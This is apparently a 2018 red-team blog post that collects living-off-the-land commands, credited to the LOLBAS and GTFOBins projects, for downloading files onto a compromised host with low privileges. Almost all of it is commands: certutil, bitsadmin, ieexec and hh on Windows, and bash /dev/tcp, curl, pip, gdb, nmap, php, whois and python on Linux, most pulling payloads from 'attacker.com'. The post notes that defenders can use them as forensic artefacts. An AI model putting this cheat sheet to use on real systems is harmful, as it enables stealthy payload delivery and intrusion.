Title: Remote File Copy all the things!
Summary: Who has not run in to the issue of wanting to remote copy a file a file during Red-Team activities while having a low privilegde user. In this post i will mention multiple commands that make use of Windows and Linux binaries present on any system and can be used to download files on to a system under low priviledge.
Date: 2018-12-10 22:00
Modified: 2018-12-10 22:01
Category: Red-Team
Tags: Red-Team, MITRE-Attack:T1105, Remote File Copy, Lateral Movement
Slug: Remote_file_copy_all_the_things
Authors: pebkac

# Background
While playing a CTF I had to copy files from one machine to the next. However I was not able to do so with a non standard binary. A few, weeks, months ago, really don't remember. I watched a talk where these 2 projects being presented. These project basicly showed a lot of research being done on system binaries that can be used during Red-Team activities. Ofcourse these can also be added to your forensic artefact list should you be interested in preventing them from being used.
<br> 
<br>
## Windows
- [Lolbas-project](https://lolbas-project.github.io/ "Lolbas-project")

## Linux
- [GTFO-bins](https://gtfobins.github.io/ "GTFO-bins")

<br>
From these websites I found multiple other binaries that could do remote file copy and so much more. I highly recommend looking them up. To make it easier for myself and maybe you? next time we might need them I copied some of command in this post for easy access. (All credits go to the researchers of those 2 great projects)
<br>
<br>

# Windows

###bitsadmin
```batch
bitsadmin /create 1 bitsadmin /addfile 1 <url>/file.ext> <output Folder>\file.ext bitsadmin /RESUME 1 bitsadmin /complete 1
```
###certutil
```batch
certutil.exe -urlcache -split -f <url>/file.ext <outputFile.ext>
```
###Esentutl
```batch
esentutl.exe /y \\<url without www>\<file.ext> /d \\otherwebdavserver\webdav\adrestore.exe /o
```
###Expand
```batch
expand \\webdav\folder\file.bat c:\ADS\file.bat
```
###Extrac32
```batch
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```
###Findstr
```batch
findstr /V /L mip9-2rnuar;gl934gmlkj \\webdavserver\folder\file.exe > c:\ADS\file.exe

```
###Hh
```batch
HH.exe http://some.url/script.ps1
```
###Ieexec
```batch
ieexec.exe http://x.x.x.x:8080/bypass.exe
```
###Makecab
```batch
makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
```
###Replace
```batch
replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
```
<br>
<br>
# Linux
###Bash
```bash
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
```
Remote file using a TCP connection. Run nc -l -p 12345 < "file_to_send" on the attacker box 
```bash
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
```
###CPAN
```bash
export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
```
###curl
```bash
URL=http://attacker.com/file_to_get
LFILE=file_to_save
curl $URL -o $LFILE
```
###easy_install
```bash
export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\"\"\")" > $TF/setup.py
pip install $TF
```
###GDB
```bash
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
```

###NMAP
Run nc target.com 12345 < "file_to_send" on the attacker 
```bash
export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);' > $TF
nmap --script=$TF
```
###php
```bash
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
```
###whois
Run nc -l -p 12345 < "file_to_send" on the attacker box<br>
The file has instances of $'\x0d' stripped.
```bash
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT > "$LFILE"
```
Run base64 "file_to_send" | nc -l -p 12345 on the attacker box
```bash
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
```
###Python
```bash
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])'
```